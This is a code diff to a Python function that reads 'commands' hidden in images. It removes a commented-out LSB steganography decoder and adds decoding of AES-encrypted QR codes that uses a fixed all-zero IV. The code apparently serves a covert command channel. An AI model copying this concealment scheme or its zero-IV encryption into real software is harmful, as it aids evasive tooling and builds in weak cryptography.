@@ -37,28 +37,19 @@ def read_frames(image_type, imagesFolder):
 		elif image_type == "qr":
 			from pyzbar.pyzbar import decode
 			text = decode(Image.open(filename))[0].data.decode()
-		'''
-		elif image_type == "stego":
-			image = cv2.imread(filename)
-			binary_data = ""
-			for row in image:
-				for pixel in row:
-					r, g, b = [ format(i, "08b") for i in pixel ]
-					binary_data += r[-1]
-					binary_data += g[-1]
-					binary_data += b[-1]
-			all_bytes = [ binary_data[i: i+8] for i in range(0, len(binary_data), 8) ]
-			decoded_data = ""
-			for byte in all_bytes:
-				decoded_data += chr(int(byte, 2))
-				if decoded_data[-5:] == "=====":
-					break
-			text = decoded_data[:-5]
-		'''
+		elif image_type == "qr_aes":
+			import base64
+			from Crypto.Cipher import AES
+			from pyzbar.pyzbar import decode
+			encrypted_text = decode(Image.open(filename))[0].data.decode()
+			enc = base64.b64decode(encrypted_text)
+			cipher = AES.new(config.aes_key, AES.MODE_CBC, chr(0) * 16) # yes, IV is all zeros xD
+			dec = cipher.decrypt(enc)
+			unpad = lambda s: s[:-ord(s[len(s)-1:])]
+			text = unpad(dec).decode('utf-8')
 		else:
 			print("[-] Error: Unknown type")
 			return "unknown_type"
-		print(text)
 		commands.append(text)
 	return commands
 
